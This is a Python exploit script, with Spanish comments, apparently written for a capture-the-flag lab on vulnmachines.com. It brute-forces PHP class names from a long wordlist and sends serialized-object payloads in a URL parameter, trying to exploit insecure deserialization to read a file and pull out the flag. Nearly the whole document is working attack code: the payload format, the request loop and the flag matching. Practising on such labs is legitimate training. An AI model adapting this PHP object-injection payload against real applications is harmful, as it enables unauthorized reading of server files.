#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

# Diccionario de palabras comunes en PHP y CTFs
dictionary = """
FileReader Filereader filereader FILEREADER file_reader File_Reader FILE_READER
ReadFile Readfile readfile READFILE read_file Read_File READ_FILE
FileHandler Filehandler filehandler FILEHANDLER file_handler File_Handler FILE_HANDLER
FileManager Filemanager filemanager FILEMANAGER file_manager File_Manager FILE_MANAGER
FileSystem Filesystem filesystem FILESYSTEM file_system File_System FILE_SYSTEM
FileLoader Fileloader fileloader FILELOADER file_loader File_Loader FILE_LOADER
FileAccess Fileaccess fileaccess FILEACCESS file_access File_Access FILE_ACCESS
FileOpen Fileopen fileopen FILEOPEN file_open File_Open FILE_OPEN
FileCat Filecat filecat FILECAT file_cat File_Cat FILE_CAT
FileRead FileREAD FILEread FILERead
ReadFlag Readflag readflag READFLAG read_flag Read_Flag READ_FLAG
FlagReader Flagreader flagreader FLAGREADER flag_reader Flag_Reader FLAG_READER
GetFlag Getflag getflag GETFLAG get_flag Get_Flag GET_FLAG
ShowFlag Showflag showflag SHOWFLAG show_flag Show_Flag SHOW_FLAG
LoadFlag Loadflag loadflag LOADFLAG load_flag Load_Flag LOAD_FLAG
DumpFlag Dumpflag dumpflag DUMPFLAG dump_flag Dump_Flag DUMP_FLAG
LeakFlag Leakflag leakflag LEAKFLAG leak_flag Leak_Flag LEAK_FLAG
Logger logger LOGGER Log log LOG Logging logging LOGGING
Debug debug DEBUG Debugger debugger DEBUGGER
Exploit exploit EXPLOIT Exploiter exploiter EXPLOITER
Payload payload PAYLOAD PayloadHandler payloadhandler PAYLOADHANDLER
Injection injection INJECTION Injector injector INJECTOR
Serialize serialize SERIALIZE Serializer serializer SERIALIZER
Unserialize unserialize UNSERIALIZE Unserializer unserializer UNSERIALIZER
Object object OBJECT ObjectHandler objecthandler OBJECTHANDLER
Handler handler HANDLER Handle handle HANDLE
Manager manager MANAGER Manage manage MANAGE
Controller controller CONTROLLER Control control CONTROL
Model model MODEL Models models MODELS
View view VIEW Views views VIEWS
Router router ROUTER Route route ROUTE
Request request REQUEST Requests requests REQUESTS
Response response RESPONSE Responses responses RESPONSES
Application application APPLICATION App app APP
Framework framework FRAMEWORK Frame frame FRAME
System system SYSTEM Systems systems SYSTEMS
Service service SERVICE Services services SERVICES
Helper helper HELPER Helpers helpers HELPERS
Utility utility UTILITY Utils utils UTILS
Common common COMMON Commons commons COMMONS
Base base BASE BaseClass baseclass BASECLASS
Core core CORE CoreClass coreclass CORECLASS
Main main MAIN MainClass mainclass MAINCLASS
Default default DEFAULT DefaultClass defaultclass DEFAULTCLASS
Custom custom CUSTOM CustomClass customclass CUSTOMCLASS
User user USER UserClass userclass USERCLASS
Admin admin ADMIN AdminClass adminclass ADMINCLASS
Root root ROOT RootClass rootclass ROOTCLASS
Super super SUPER SuperClass superclass SUPERCLASS
Magic magic MAGIC MagicClass magicclass MAGICCLASS
Secret secret SECRET SecretClass secretclass SECRETCLASS
Hidden hidden HIDDEN HiddenClass hiddenclass HIDDENCLASS
Private private PRIVATE PrivateClass privateclass PRIVATECLASS
Public public PUBLIC PublicClass publicclass PUBLICCLASS
Protected protected PROTECTED ProtectedClass protectedclass PROTECTEDCLASS
Internal internal INTERNAL InternalClass internalclass INTERNALCLASS
External external EXTERNAL ExternalClass externalclass EXTERNALCLASS
Local local LOCAL LocalClass localclass LOCALCLASS
Remote remote REMOTE RemoteClass remoteclass REMOTECLASS
Server server SERVER ServerClass serverclass SERVERCLASS
Client client CLIENT ClientClass clientclass CLIENTCLASS
Database database DATABASE Db db DB
Cache cache CACHE Cached cached CACHED
Session session SESSION Sessions sessions SESSIONS
Cookie cookie COOKIE Cookies cookies COOKIES
Token token TOKEN Tokens tokens TOKENS
Auth auth AUTH Authentication authentication AUTHENTICATION
Login login LOGIN Logout logout LOGOUT
Register register REGISTER Registration registration REGISTRATION
Validate validate VALIDATE Validation validation VALIDATION
Filter filter FILTER Filters filters FILTERS
Sanitize sanitize SANITIZE Sanitizer sanitizer SANITIZER
Escape escape ESCAPE Escaper escaper ESCAPER
Encode encode ENCODE Encoder encoder ENCODER
Decode decode DECODE Decoder decoder DECODER
Encrypt encrypt ENCRYPT Encryption encryption ENCRYPTION
Decrypt decrypt DECRYPT Decryption decryption DECRYPTION
Hash hash HASH Hashing hashing HASHING
Salt salt SALT Salting salting SALTING
Random random RANDOM Randomizer randomizer RANDOMIZER
Generator generator GENERATOR Generate generate GENERATE
Factory factory FACTORY Factories factories FACTORIES
Builder builder BUILDER Build build BUILD
Creator creator CREATOR Create create CREATE
Destroyer destroyer DESTROYER Destroy destroy DESTROY
Deleter deleter DELETER Delete delete DELETE
Remover remover REMOVER Remove remove REMOVE
Updater updater UPDATER Update update UPDATE
Modifier modifier MODIFIER Modify modify MODIFY
Changer changer CHANGER Change change CHANGE
Setter setter SETTER Set set SET
Getter getter GETTER Get get GET
Accessor accessor ACCESSOR Access access ACCESS
Mutator mutator MUTATOR Mutate mutate MUTATE
Iterator iterator ITERATOR Iterate iterate ITERATE
Traverser traverser TRAVERSER Traverse traverse TRAVERSE
Walker walker WALKER Walk walk WALK
Visitor visitor VISITOR Visit visit VISIT
Observer observer OBSERVER Observe observe OBSERVE
Listener listener LISTENER Listen listen LISTEN
Watcher watcher WATCHER Watch watch WATCH
Monitor monitor MONITOR Monitoring monitoring MONITORING
Tracker tracker TRACKER Track track TRACK
Logger logger LOGGER Log log LOG
Recorder recorder RECORDER Record record RECORD
Reporter reporter REPORTER Report report REPORT
Analyzer analyzer ANALYZER Analyze analyze ANALYZE
Scanner scanner SCANNER Scan scan SCAN
Parser parser PARSER Parse parse PARSE
Lexer lexer LEXER Lex lex LEX
Tokenizer tokenizer TOKENIZER Tokenize tokenize TOKENIZE
Compiler compiler COMPILER Compile compile COMPILE
Interpreter interpreter INTERPRETER Interpret interpret INTERPRET
Executor executor EXECUTOR Execute execute EXECUTE
Runner runner RUNNER Run run RUN
Processor processor PROCESSOR Process process PROCESS
Worker worker WORKER Work work WORK
Task task TASK Tasks tasks TASKS
Job job JOB Jobs jobs JOBS
Queue queue QUEUE Queues queues QUEUES
Stack stack STACK Stacks stacks STACKS
List list LIST Lists lists LISTS
Array array ARRAY Arrays arrays ARRAYS
Collection collection COLLECTION Collections collections COLLECTIONS
Set set SET Sets sets SETS
Map map MAP Maps maps MAPS
Dictionary dictionary DICTIONARY Dict dict DICT
Table table TABLE Tables tables TABLES
Row row ROW Rows rows ROWS
Column column COLUMN Columns columns COLUMNS
Field field FIELD Fields fields FIELDS
Property property PROPERTY Properties properties PROPERTIES
Attribute attribute ATTRIBUTE Attributes attributes ATTRIBUTES
Method method METHOD Methods methods METHODS
Function function FUNCTION Functions functions FUNCTIONS
Procedure procedure PROCEDURE Procedures procedures PROCEDURES
Routine routine ROUTINE Routines routines ROUTINES
Callback callback CALLBACK Callbacks callbacks CALLBACKS
Hook hook HOOK Hooks hooks HOOKS
Event event EVENT Events events EVENTS
Trigger trigger TRIGGER Triggers triggers TRIGGERS
Action action ACTION Actions actions ACTIONS
Command command COMMAND Commands commands COMMANDS
Operation operation OPERATION Operations operations OPERATIONS
Transaction transaction TRANSACTION Transactions transactions TRANSACTIONS
Query query QUERY Queries queries QUERIES
Statement statement STATEMENT Statements statements STATEMENTS
Expression expression EXPRESSION Expressions expressions EXPRESSIONS
Condition condition CONDITION Conditions conditions CONDITIONS
Rule rule RULE Rules rules RULES
Policy policy POLICY Policies policies POLICIES
Strategy strategy STRATEGY Strategies strategies STRATEGIES
Pattern pattern PATTERN Patterns patterns PATTERNS
Template template TEMPLATE Templates templates TEMPLATES
Layout layout LAYOUT Layouts layouts LAYOUTS
Theme theme THEME Themes themes THEMES
Style style STYLE Styles styles STYLES
Format format FORMAT Formats formats FORMATS
Render render RENDER Renderer renderer RENDERER
Display display DISPLAY Displayer displayer DISPLAYER
Show show SHOW Shower shower SHOWER
Hide hide HIDE Hider hider HIDER
Toggle toggle TOGGLE Toggler toggler TOGGLER
Switch switch SWITCH Switcher switcher SWITCHER
Enable enable ENABLE Enabler enabler ENABLER
Disable disable DISABLE Disabler disabler DISABLER
Activate activate ACTIVATE Activator activator ACTIVATOR
Deactivate deactivate DEACTIVATE Deactivator deactivator DEACTIVATOR
Start start START Starter starter STARTER
Stop stop STOP Stopper stopper STOPPER
Begin begin BEGIN Beginner beginner BEGINNER
End end END Ender ender ENDER
Open open OPEN Opener opener OPENER
Close close CLOSE Closer closer CLOSER
Connect connect CONNECT Connector connector CONNECTOR
Disconnect disconnect DISCONNECT Disconnector disconnector DISCONNECTOR
Attach attach ATTACH Attacher attacher ATTACHER
Detach detach DETACH Detacher detacher DETACHER
Bind bind BIND Binder binder BINDER
Unbind unbind UNBIND Unbinder unbinder UNBINDER
Link link LINK Linker linker LINKER
Unlink unlink UNLINK Unlinker unlinker UNLINKER
Join join JOIN Joiner joiner JOINER
Split split SPLIT Splitter splitter SPLITTER
Merge merge MERGE Merger merger MERGER
Combine combine COMBINE Combiner combiner COMBINER
Separate separate SEPARATE Separator separator SEPARATOR
Divide divide DIVIDE Divider divider DIVIDER
Group group GROUP Grouper grouper GROUPER
Ungroup ungroup UNGROUP Ungrouper ungrouper UNGROUPER
Sort sort SORT Sorter sorter SORTER
Order order ORDER Orderer orderer ORDERER
Arrange arrange ARRANGE Arranger arranger ARRANGER
Organize organize ORGANIZE Organizer organizer ORGANIZER
Shuffle shuffle SHUFFLE Shuffler shuffler SHUFFLER
Randomize randomize RANDOMIZE Randomizer randomizer RANDOMIZER
""".split()

# Eliminar duplicados
dictionary = list(set(dictionary))

print(f"[*] Dictionary attack with {len(dictionary)} words")

count = 0
for word in dictionary:
    count += 1
    if count % 100 == 0:
        print(f"    Tested {count}/{len(dictionary)} words...")
    
    payload = f'O:{len(word)}:"{word}":1:{{s:4:"file";s:13:"/etc/f149.txt";}}'
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    try:
        r = requests.get(url, timeout=0.5)
        if 'vulnmachines{' in r.text.lower():
            print(f"\n[!!!] FOUND: {word}")
            matches = re.findall(r'vulnmachines\{[^}]+\}', r.text, re.IGNORECASE)
            if matches:
                print(f"[!!!] FLAG: {matches[0]}")
            exit(0)
    except:
        pass

print("[-] Dictionary attack failed")